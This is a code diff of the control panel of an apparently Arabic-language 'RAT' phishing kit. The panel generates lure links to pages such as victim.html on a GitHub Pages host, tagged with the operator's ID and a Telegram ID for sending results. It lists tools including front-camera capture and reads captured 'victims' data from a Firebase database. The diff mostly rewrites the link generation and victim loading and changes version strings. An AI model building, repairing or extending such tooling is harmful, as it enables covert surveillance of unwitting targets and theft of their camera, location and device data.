@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>RAT | Elcomando & Princess v⁶</title>
+    <title>RAT | Elcomando & Princess v³</title>
     
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
@@ -56,7 +56,7 @@
         .header { height: 65px; background: rgba(0,0,0,0.9); border-bottom: 2px solid var(--primary); display: flex; align-items: center; padding: 0 20px; position: fixed; top: 0; width: 100%; box-sizing: border-box; z-index: 1000; }
         .header h1 { font-family: 'Orbitron'; font-size: 16px; color: var(--primary); text-shadow: 0 0 10px var(--primary); margin: 0; flex: 1; }
 
-        .viewport { margin-top: 75px; height: calc(100vh - 165px); overflow-y: auto; padding: 15px; }
+        .viewport { margin-top: 75px; height: calc(100vh - 190px); overflow-y: auto; padding: 15px; }
         .page { display: none; }
         .page.active { display: block; animation: zoomIn 0.3s ease; }
         @keyframes zoomIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
@@ -453,7 +453,7 @@ button[onclick*="save"]:hover {
                 <button class="btn" onclick="handleAuth('login')">LOGIN SYSTEM 🔓</button>
                 <p onclick="toggleAuth(true)" style="font-size: 11px; margin-top: 15px; color: var(--primary); cursor: pointer;">CREATE ACCOUNT</p>
                 <div style="margin-top: 25px; font-size: 11px; color: #444; font-family: 'Orbitron'; text-align: center; border-top: 1px solid #222; padding-top: 10px;">
-                    © 2026 ELCOMANDO VERSION 6.0
+                    © 2026 ELCOMANDO VERSION 3.0
                 </div>
             </div>
             <div id="signup-box" style="display: none;">
@@ -462,7 +462,7 @@ button[onclick*="save"]:hover {
                 <button class="btn" onclick="handleAuth('signup')">SIGN UP 🛠️</button>
                 <p onclick="toggleAuth(false)" style="font-size: 11px; margin-top: 15px; color: var(--primary); cursor: pointer;">HAVE ACCOUNT? LOGIN</p>
                 <div style="margin-top: 25px; font-size: 11px; color: #444; font-family: 'Orbitron'; text-align: center; border-top: 1px solid #222; padding-top: 10px;">
-                    © 2026 ELCOMANDO VERSION 6.0
+                    © 2026 ELCOMANDO VERSION 3.0
                 </div>
             </div>
         </div>
@@ -500,10 +500,8 @@ button[onclick*="save"]:hover {
         <small style="color: #888; font-size: 10px; display: block; margin-bottom: 10px;">
             👤 سيتم إرسال النتائج لهذا الـ ID على التليجرام
         </small>
-   
-<button class="btn btn-neon" onclick="generateCustomLink()">
-    GENERATE 🚀
-</button>
+        
+        <button class="btn btn-neon" onclick="generateCustomLink()">GENERATE 🚀</button>
         
         <div id="generated-result" style="display:none; margin-top:15px; padding:10px; border:1px dashed var(--primary); font-size:10px; word-break: break-all;">
             <span id="final-link"></span><br><br>
@@ -664,17 +662,17 @@ button[onclick*="save"]:hover {
             </p>
             
             <div style="display: flex; justify-content: center; gap: 25px; margin-bottom: 20px;">
-                <a href="https://youtube.com/" target="_blank" style="color: #ff0000; font-size: 24px; transition: 0.3s; position: relative;">
+                <a href="https://youtube.com/@ELCOMANDO_OFFICIAL" target="_blank" style="color: #ff0000; font-size: 24px; transition: 0.3s; position: relative;">
                     <i class="fab fa-youtube"></i>
                     <span style="position: absolute; top: -5px; right: -5px; background: #ff0000; color: white; border-radius: 50%; width: 16px; height: 16px; font-size: 9px; display: flex; align-items: center; justify-content: center; animation: pulse 1.5s infinite;">▶</span>
                 </a>
                 
-                <a href="https://t.me/ELCOMANDO_C_M_D_1" target="_blank" style="color: #0088cc; font-size: 24px; transition: 0.3s; position: relative;">
+                <a href="https://t.me/ELCOMANDO_CHANNEL" target="_blank" style="color: #0088cc; font-size: 24px; transition: 0.3s; position: relative;">
                     <i class="fas fa-bullhorn"></i>
                     <span style="position: absolute; top: -5px; right: -5px; background: #0088cc; color: white; border-radius: 50%; width: 16px; height: 16px; font-size: 9px; display: flex; align-items: center; justify-content: center; animation: pulse 1.5s infinite;">📢</span>
                 </a>
                 
-                <a href="https://t.me/ELCOMANDO_C_M_D_1" target="_blank" style="color: var(--primary); font-size: 24px; transition: 0.3s; position: relative;">
+                <a href="https://t.me/ELCOMANDO_SUPPORT" target="_blank" style="color: var(--primary); font-size: 24px; transition: 0.3s; position: relative;">
                     <i class="fab fa-telegram"></i>
                     <span style="position: absolute; top: -5px; right: -5px; background: var(--primary); color: white; border-radius: 50%; width: 16px; height: 16px; font-size: 9px; display: flex; align-items: center; justify-content: center; animation: pulse 1.5s infinite;">💬</span>
                 </a>
@@ -683,7 +681,7 @@ button[onclick*="save"]:hover {
             <!-- معلومات النظام -->
             <div style="background: rgba(0,0,0,0.3); padding: 10px; border-radius: 8px; text-align: center; margin-top: 15px;">
                 <small style="color: #888; font-family: 'Orbitron';">
-                    <i class="fas fa-code-branch"></i> ELCOMANDO V6.0
+                    <i class="fas fa-code-branch"></i> ELCOMANDO V3.0
                 </small>
                 <div style="height: 1px; background: linear-gradient(to right, transparent, var(--primary), transparent); margin: 8px 0;"></div>
                 <small style="color: #666; font-size: 9px;">
@@ -708,15 +706,6 @@ button[onclick*="save"]:hover {
     const firebaseConfig = { databaseURL: "https://elcomando-68116-default-rtdb.firebaseio.com/" };
     if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
     const db = firebase.database();
-    
-    // ✅ في أول السكريبت بعد Firebase
-window.generateCustomLink = window.generateCustomLink || function() {
-    alert("Generate function is working!");
-};
-
-window.openToolPage = window.openToolPage || function(tool) {
-    alert("Opening tool: " + tool);
-};
 
     const tools = [
         { name: "كاميرا امامي", value: "fcam", icon: "fas fa-camera" },
@@ -953,81 +942,34 @@ window.openToolPage = window.openToolPage || function(tool) {
             return showAlert("ACCESS DENIED 🚫", "هذا القسم مغلق لحسابك.");
         }
 
-// ✅ دالة توليد اللينك المعدلة
-window.generateCustomLink = function() {
-    console.log("Generate button clicked!"); // للتأكد
-    
-    const tool = document.getElementById('tool-select').value;
-    const telegramId = document.getElementById('telegram-id').value || "";
-    const user = localStorage.getItem('logged_user');
-    
-    if (!user) {
-        showAlert("ERROR", "يجب تسجيل الدخول أولاً");
-        return;
+        async function openToolPage(toolValue) {
+    try {
+        const user = localStorage.getItem('logged_user');
+        const currentUrl = window.location.href;
+        const baseUrl = currentUrl.substring(0, currentUrl.lastIndexOf('/'));
+        
+        const link = `${baseUrl}/${toolValue}.html?user_id=${user}`;
+        
+        document.getElementById('tool-link-display').innerText = link;
+        document.getElementById('copy-tool-btn').onclick = () => {
+            navigator.clipboard.writeText(link);
+            showAlert("تم النسخ ✅", "تم نسخ رابط الأداة");
+        };
+        
+        const toolObj = tools.find(t => t.value === toolValue);
+        nav('tool', toolObj.name, '⚙️', null);
+        loadVictims(toolValue, user);
+    } catch (error) {
+        console.error(error);
     }
-    
-    if (!tool) {
-        showAlert("ERROR", "اختر أداة أولاً");
-        return;
-    }
-    
-    const baseUrl = "https://supportcmd.github.io"; // استخدم الرابط الثابت
-    
-    // ✅ استخدام اسم الأداة كاسم الملف
-    let link = `${baseUrl}/${tool}.html?user_id=${user}&tool=${tool}`;
-    
-    if (telegramId.trim() !== "") {
-        link += `&telegram=${telegramId.trim()}`;
-    }
-    
-    document.getElementById('final-link').innerText = link;
-    document.getElementById('generated-result').style.display = 'block';
-    
-    showAlert("SUCCESS", "تم إنشاء الرابط بنجاح ✅");
 }
 
-// ✅ دالة فتح الأداة المعدلة
-window.openToolPage = async function(toolValue) {
-    console.log("Opening tool:", toolValue);
-    
-    const user = localStorage.getItem('logged_user');
-    if (!user) {
-        showAlert("ERROR", "يجب تسجيل الدخول أولاً");
-        return;
-    }
-    
-    // ✅ التأكد من الصلاحيات
-    const permSnap = await db.ref('permissions/' + user + '/' + toolValue).once('value');
-    
-    if(permSnap.val() === false) {
-        return showAlert("ACCESS DENIED 🚫", "هذا القسم مغلق لحسابك.");
-    }
-    
-    // ✅ فتح الرابط في صفحة جديدة
-    const baseUrl = "https://supportcmd.github.io";
-    const link = `${baseUrl}/${toolValue}.html?user_id=${user}&tool=${toolValue}`;
-    
-    // ✅ نسخ الرابط
-    navigator.clipboard.writeText(link);
-    
-    // ✅ فتح في تبويب جديد
-    window.open(link, '_blank');
-    
-    showAlert("LINK COPIED ✅", "تم نسخ الرابط وفتح الأداة");
-    
-    // ✅ عرض الفيكتمز
-    const toolObj = tools.find(t => t.value === toolValue);
-    nav('tool', toolObj?.name || toolValue, '⚙️', null);
-    loadVictims(toolValue, user);
-}
 
     // تعديل جلب الضحايا لعرض البيانات الجديدة (الموقع والجهاز)
     function loadVictims(tool, user) {
-        // القراءة من المسار الموحد hits/userId
-        const victimRef = db.ref('hits/' + user); 
-        
-        victimRef.on('value', snap => {
-            const list = document.getElementById('victim-list');
+    const victimRef = db.ref('hits/' + user + '/' + tool); // المسار الموحد
+    victimRef.on('value', snap => {
+        const list = document.getElementById('victim-list');
             list.innerHTML = snap.exists() ? "" : "<p class='no-data'>في انتظار الضحايا... 🎣</p>";
             
             if (snap.exists()) {
@@ -1060,22 +1002,25 @@ window.openToolPage = async function(toolValue) {
     }
 
     function generateCustomLink() {
-    const tool = document.getElementById('tool-select').value;
-    const telegramId = document.getElementById('telegram-id').value || "";
-    const user = localStorage.getItem('logged_user');
-    
-    const baseUrl = window.location.href.split('/').slice(0, -1).join('/');
-    
-    // ✅ ده الحل: استخدم اسم الأداة نفسه كاسم ملف
-    let link = `${baseUrl}/${tool}.html?user_id=${user}&tool=${tool}`;
-    
-    if (telegramId.trim() !== "") {
-        link += `&telegram=${telegramId.trim()}`;
-    }
-    
-    document.getElementById('final-link').innerText = link;
-    document.getElementById('generated-result').style.display = 'block';
-}
+        const tool = document.getElementById('tool-select').value;
+        const telegramId = document.getElementById('telegram-id').value || "";
+        const user = localStorage.getItem('logged_user');
+        
+        const baseUrl = window.location.href.split('/').slice(0, -1).join('/');
+        
+        // بناء الرابط مع ID التليجرام إذا تم إدخاله
+        let link = `${baseUrl}/victim.html?user_id=${user}&tool=${tool}`;
+        
+        // إضافة ID التليجرام للرابط إذا كان موجود
+        if (telegramId.trim() !== "") {
+            link += `&telegram=${telegramId.trim()}`;
+            
+            // حفظ ID التليجرام في قاعدة البيانات
+            saveTelegramIdToDB(user, telegramId.trim());
+        }
+        
+        document.getElementById('final-link').innerText = link;
+        document.getElementById('generated-result').style.display = 'block';
         
         // إظهار رسالة تأكيد
         if (telegramId.trim() !== "") {
@@ -1537,7 +1482,7 @@ function showTermsCertificate() {
                     
                     <div style="text-align: left;">
                         <small style="color: #888;">التوقيع الرقمي</small><br>
-                        <span style="color: var(--primary); font-family: 'Orbitron';">C_M_D_1 V6</span>
+                        <span style="color: var(--primary); font-family: 'Orbitron';">ELCOMANDO V3</span>
                     </div>
                 </div>
             </div>
